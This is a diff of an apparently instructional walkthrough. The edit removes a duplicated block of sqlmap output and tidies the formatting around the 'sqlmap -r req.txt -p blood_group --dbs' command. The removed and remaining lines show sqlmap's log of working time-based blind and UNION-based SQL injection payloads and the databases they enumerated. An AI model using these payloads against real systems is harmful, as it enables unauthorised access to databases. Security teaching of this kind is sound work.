@@ -270,51 +270,11 @@ Now that we’ve identified a potentially vulnerable parameter, let’s jump int
 
 `sqlmap -r <request_file> -p <vulnerable_parameter> --dbs`
 
-Here we have used two flags: -r to read the file, -p to supply the vulnerable parameter, and --dbs to enumerate the database.
-
-Database Enumeration:
-
-
-nare@nare$ sqlmap -r req.txt -p blood_group --dbs
-[19:31:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
-[19:31:50] [INFO] POST parameter 'blood_group' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
-it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
-for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
-[19:33:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[19:33:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[19:33:09] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
-[19:33:09] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
-[19:33:10] [WARNING] reflective value(s) found and filtering out
-[19:33:12] [INFO] target URL appears to be UNION injectable with 8 columns
-[19:33:13] [INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
-POST parameter 'blood_group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
----
-Parameter: blood_group (POST)
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
----
-[19:33:16] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu
-web application technology: Nginx 1.10.3
-back-end DBMS: MySQL >= 5.0.12
-[19:33:17] [INFO] fetching database names
-available databases [6]:
-[*] blood
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] sys
-Here we have used two flags: -r to read the file, -p to supply the vulnerable parameter, and --dbs to enumerate the database.
+Here we have used two flags: `-r` to read the file, `-p` to supply the vulnerable parameter, and `--dbs` to enumerate the database.
 
 Database Enumeration
 
-```shell-session
+```shell
 nare@nare$ sqlmap -r req.txt -p blood_group --dbs
 [19:31:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
 [19:31:50] [INFO] POST parameter 'blood_group' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
